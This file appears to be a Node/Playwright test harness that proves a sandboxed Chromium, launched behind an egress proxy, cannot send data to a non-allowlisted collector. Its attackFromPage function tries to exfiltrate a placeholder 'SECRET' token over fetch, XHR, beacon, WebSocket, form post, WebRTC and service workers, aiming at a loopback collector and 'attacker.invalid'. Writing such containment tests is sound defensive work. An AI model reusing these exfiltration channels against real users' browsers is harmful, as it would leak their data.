import dgram from "node:dgram";
import net from "node:net";
import { readFile } from "node:fs/promises";
import { pathToFileURL } from "node:url";
import { chromium } from "@playwright/test";
import {
  BROWSER_EGRESS_PROXY_ENV,
  DEFAULT_CANDIDATE_ORIGIN,
  EGRESS_CONTEXT_OPTIONS,
  browserEgressLaunchOptions,
  parseEgressDenialLog,
} from "./browserEgressContainment.mjs";
import { EGRESS_PROOF_CHANNELS, EGRESS_PROOF_NAVIGATION_OUTCOMES } from "./browserEgressChannels.mjs";

export { EGRESS_PROOF_CHANNELS, EGRESS_PROOF_NAVIGATION_OUTCOMES };

/** File the trusted workflow redirects the proxy's stdout into. */
const PROXY_LOG_ENV = "BROWSER_EGRESS_PROXY_LOG";

/**
 * Runtime proof that the browser launched with the egress options cannot
 * deliver anything to a non-allowlisted collector, while an allowlisted origin
 * still works. The collector sits on 127.0.0.2: loopback, so without the proxy
 * and the Chromium flags a page reaches it trivially. Every channel a malicious
 * page could use is exercised: fetch, XHR, image, sendBeacon, WebSocket,
 * EventSource, form post, iframe and top-level navigation, popup, WebRTC (UDP)
 * and service worker registration.
 *
 * It uses the REAL launch options from browserEgressContainment.mjs, so a
 * regression there fails this proof.
 */

const COLLECTOR_HOST = "127.0.0.2";
const SETTLE_MS = 2500;

async function startTcpCollector() {
  const hits = [];
  const server = net.createServer((socket) => {
    hits.push("tcp-connection");
    socket.on("data", () => hits.push("tcp-data"));
    socket.on("error", () => {});
    socket.end("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
  });
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, COLLECTOR_HOST, resolve);
  });
  return { hits, port: server.address().port, close: () => server.close() };
}

async function startUdpCollector() {
  const hits = [];
  const socket = dgram.createSocket("udp4");
  socket.on("message", () => hits.push("udp-packet"));
  await new Promise((resolve, reject) => {
    socket.once("error", reject);
    socket.bind(0, COLLECTOR_HOST, resolve);
  });
  return { hits, port: socket.address().port, close: () => socket.close() };
}

/**
 * Runs inside the page. Never throws: each channel reports its own outcome.
 * Exported only so a test can execute it against fake browser globals; the
 * browser receives its source through page.evaluate exactly as before.
 *
 * @param {{ tcpPort: number, udpPort: number, host: string, allowedUrl: string }} input
 * @returns {Promise<{ outcomes: Record<string, string>, allowedStatus: number }>}
 */
export async function attackFromPage({ tcpPort, udpPort, host, allowedUrl }) {
  const target = `http://${host}:${tcpPort}/exfil?token=SECRET`;
  const outcomes = {};
  const attempt = async (name, fn) => {
    try {
      outcomes[name] = String((await fn()) ?? "ok");
    } catch (error) {
      outcomes[name] = "threw:" + (error && error.name ? error.name : "error");
    }
  };

  await attempt("fetch", () => fetch(target, { mode: "no-cors", credentials: "include" }).then((r) => r.type));
  await attempt("fetch-keepalive", () => fetch(target, { mode: "no-cors", keepalive: true, method: "POST", body: "SECRET" }).then((r) => r.type));
  await attempt("fetch-https", () => fetch(`https://${host}:${tcpPort}/exfil`, { mode: "no-cors" }).then((r) => r.type));
  await attempt("fetch-unknown-name", () => fetch("http://attacker.invalid/exfil", { mode: "no-cors" }).then((r) => r.type));
  await attempt("xhr", () => new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", target);
    xhr.onloadend = () => resolve("done");
    xhr.send();
  }));
  await attempt("image", () => new Promise((resolve) => {
    const img = new Image();
    img.onload = img.onerror = () => resolve("done");
    img.src = target;
  }));
  await attempt("beacon", () => String(navigator.sendBeacon(target, "SECRET")));
  await attempt("websocket", () => new Promise((resolve) => {
    const ws = new WebSocket(`ws://${host}:${tcpPort}/exfil`);
    ws.onopen = () => resolve("open");
    ws.onerror = () => resolve("error");
    ws.onclose = () => resolve("close");
    setTimeout(() => resolve("timeout"), 2000);
  }));
  await attempt("eventsource", () => new Promise((resolve) => {
    const source = new EventSource(target);
    source.onerror = () => { source.close(); resolve("error"); };
    setTimeout(() => { source.close(); resolve("timeout"); }, 2000);
  }));
  await attempt("iframe", () => new Promise((resolve) => {
    const frame = document.createElement("iframe");
    frame.onload = frame.onerror = () => resolve("done");
    frame.src = target;
    document.body.appendChild(frame);
    setTimeout(() => resolve("timeout"), 2000);
  }));
  await attempt("form-post", () => new Promise((resolve) => {
    const frame = document.createElement("iframe");
    frame.name = "egress-form-target";
    document.body.appendChild(frame);
    const form = document.createElement("form");
    form.method = "POST";
    form.action = target;
    form.target = "egress-form-target";
    form.innerHTML = '<input name="d" value="SECRET">';
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => resolve("submitted"), 1000);
  }));
  await attempt("popup", () => String(Boolean(window.open(target, "_blank"))));
  await attempt("webrtc", async () => {
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: `stun:${host}:${udpPort}` },
        { urls: `turn:${host}:${udpPort}?transport=udp`, username: "u", credential: "SECRET" },
      ],
    });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
    await new Promise((resolve) => setTimeout(resolve, 1500));
    pc.close();
    return "attempted";
  });
  await attempt("service-worker", async () => {
    if (!("serviceWorker" in navigator)) return "unavailable";
    // With serviceWorkers:"block" Playwright makes register() resolve with
    // undefined and never fetches the script, so a resolved promise alone is not
    // evidence of a registration: ask the browser what is actually registered.
    await navigator.serviceWorker.register("/__egress_sw.js");
    await new Promise((resolve) => setTimeout(resolve, 1000));
    const registrations = await navigator.serviceWorker.getRegistrations();
    return registrations.length > 0 ? "REGISTERED" : "blocked";
  });

  let allowedStatus = 0;
  try {
    allowedStatus = (await fetch(allowedUrl)).status;
  } catch {
    allowedStatus = -1;
  }
  return { outcomes, allowedStatus };
}

/**
 * Every failure derivable from what the collectors and the page reported.
 * Order is part of the evidence format: collector, allowlisted origin, probes,
 * navigation.
 *
 * @param {{
 *   tcpEvents: number,
 *   udpPackets: number,
 *   attackResult: { outcomes: Record<string, unknown>, allowedStatus: number },
 *   navigation: string,
 * }} input
 * @returns {string[]}
 */
export function collectProofFailures({ tcpEvents, udpPackets, attackResult, navigation }) {
  const failures = [];
  if (tcpEvents > 0) failures.push(`collector received TCP traffic (${tcpEvents} events)`);
  if (udpPackets > 0) failures.push(`collector received UDP traffic (${udpPackets} packets)`);
  if (attackResult.allowedStatus !== 200) {
    failures.push(`allowlisted origin was not reachable through the proxy (status ${attackResult.allowedStatus})`);
  }
  // Every mandatory probe must have run and ended in a contained outcome; an
  // unavailable or missing probe is a failure, never a skip.
  for (const [name, accepted] of Object.entries(EGRESS_PROOF_CHANNELS)) {
    const outcome = attackResult.outcomes[name];
    if (typeof outcome !== "string" || !accepted.includes(outcome)) {
      failures.push(`mandatory probe "${name}" did not end in a contained outcome`);
    }
  }
  for (const name of Object.keys(attackResult.outcomes)) {
    if (!(name in EGRESS_PROOF_CHANNELS)) failures.push("an unlisted probe ran");
  }
  if (!EGRESS_PROOF_NAVIGATION_OUTCOMES.includes(navigation)) {
    failures.push("top-level navigation to the collector was not refused");
  }
  return failures;
}

/**
 * Positive control: the proxy itself must have recorded the refusals. Only
 * fixed reason codes are read back; the host of the probe is never logged.
 *
 * @param {(() => Promise<string> | string) | undefined} readProxyLog
 * @returns {Promise<{ proxyDenials: Record<string, number> | null, failures: string[] }>}
 */
export async function assessProxyDenials(readProxyLog) {
  const failures = [];
  /** @type {Record<string, number> | null} */
  let proxyDenials = null;
  try {
    if (!readProxyLog) throw new Error("no proxy log");
    const parsed = parseEgressDenialLog(await readProxyLog());
    proxyDenials = { ...parsed.denials, unrecognized: parsed.unrecognized };
  } catch {
    failures.push("the proxy denial log could not be read");
  }
  if (proxyDenials) {
    if (!(proxyDenials["not-allowlisted-loopback"] >= 1)) {
      failures.push("the proxy did not record a denial of the loopback collector probe");
    }
    if (proxyDenials.unrecognized > 0) {
      failures.push("the proxy log contained lines outside the fixed vocabulary");
    }
  }
  return { proxyDenials, failures };
}

/**
 * @param {{
 *   env?: Record<string, string | undefined>,
 *   allowedOrigin?: string,
 *   allowedPath?: string,
 *   readProxyLog?: () => Promise<string> | string,
 *   launchBrowser?: (options: Record<string, unknown>) => Promise<any>,
 *   settleMs?: number,
 * }} [options]
 */
export async function runBrowserEgressProof({
  env = process.env,
  allowedOrigin = DEFAULT_CANDIDATE_ORIGIN,
  allowedPath = "/api/health",
  // Supplies the proxy's own (fixed-vocabulary) denial log. Defaults to the file
  // named by BROWSER_EGRESS_PROXY_LOG; when neither exists the proof fails closed.
  readProxyLog = env[PROXY_LOG_ENV]
    ? () => readFile(env[PROXY_LOG_ENV], "utf8")
    : undefined,
  // Injection points for tests; the defaults are the real Chromium launcher and
  // the real settle delay, so the CLI behaves exactly as before.
  launchBrowser = (options) => chromium.launch(options),
  settleMs = SETTLE_MS,
} = {}) {
  const launch = browserEgressLaunchOptions({ ...env, BROWSER_EGRESS_REQUIRED: "1" });
  const tcp = await startTcpCollector();
  const udp = await startUdpCollector();
  /** @type {{ outcomes: Record<string, unknown>, allowedStatus: number }} */
  let attackResult;
  /** @type {string} */
  let navigation;

  const browser = await launchBrowser({ headless: true, ...launch });
  try {
    const context = await browser.newContext({ ...EGRESS_CONTEXT_OPTIONS });
    // The page itself is synthesised at the allowlisted origin so it is a secure
    // context (service workers need one) without involving the real candidate.
    // Only the attack's own requests then cross the network, via the proxy.
    await context.route(`${allowedOrigin}/__egress_proof__`, (route) =>
      route.fulfill({ contentType: "text/html", body: "<!doctype html><title>proof</title><body></body>" }),
    );
    await context.route(`${allowedOrigin}/__egress_sw.js`, (route) =>
      route.fulfill({ contentType: "text/javascript", body: "self.addEventListener('fetch',()=>{});" }),
    );
    const page = await context.newPage();
    await page.goto(`${allowedOrigin}/__egress_proof__`);
    attackResult = await page.evaluate(attackFromPage, {
      tcpPort: tcp.port,
      udpPort: udp.port,
      host: COLLECTOR_HOST,
      allowedUrl: `${allowedOrigin}${allowedPath}`,
    });

    const nav = await context.newPage();
    navigation = await nav
      .goto(`http://${COLLECTOR_HOST}:${tcp.port}/exfil?token=SECRET`, { timeout: 5000 })
      .then((response) => `response:${response?.status() ?? "none"}`)
      .catch(() => "failed");
    await new Promise((resolve) => setTimeout(resolve, settleMs));
  } finally {
    await browser.close().catch(() => {});
    tcp.close();
    udp.close();
  }

  const failures = collectProofFailures({
    tcpEvents: tcp.hits.length,
    udpPackets: udp.hits.length,
    attackResult,
    navigation,
  });
  const assessed = await assessProxyDenials(readProxyLog);
  failures.push(...assessed.failures);
  const proxyDenials = assessed.proxyDenials;
  return {
    ok: failures.length === 0,
    failures,
    collector: { tcpEvents: tcp.hits.length, udpPackets: udp.hits.length },
    allowedStatus: attackResult.allowedStatus,
    topLevelNavigation: navigation,
    channels: attackResult.outcomes,
    proxyDenials,
  };
}

/**
 * CLI body used by the trusted workflow. Fails closed on every path.
 *
 * @param {{
 *   env?: Record<string, string | undefined>,
 *   run?: typeof runBrowserEgressProof,
 *   stdout?: (text: string) => void,
 *   stderr?: (text: string) => void,
 *   exit?: (code: number) => void,
 * }} [io]
 */
export async function runBrowserEgressProofCli({
  env = process.env,
  run = runBrowserEgressProof,
  stdout = (text) => process.stdout.write(text),
  stderr = (text) => process.stderr.write(text),
  exit = (code) => process.exit(code),
} = {}) {
  if (!env[BROWSER_EGRESS_PROXY_ENV]) {
    stderr(`${BROWSER_EGRESS_PROXY_ENV} is required.\n`);
    exit(1);
    return;
  }
  try {
    const result = await run({
      env,
      allowedOrigin: env.BROWSER_EGRESS_ALLOWED_ORIGIN || DEFAULT_CANDIDATE_ORIGIN,
      allowedPath: env.BROWSER_EGRESS_ALLOWED_PATH || "/api/health",
    });
    stdout(JSON.stringify(result, null, 2) + "\n");
    exit(result.ok ? 0 : 1);
  } catch (error) {
    stderr(`Egress proof could not run: ${error instanceof Error ? error.message : "unknown"}\n`);
    exit(1);
  }
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  void runBrowserEgressProofCli();
}
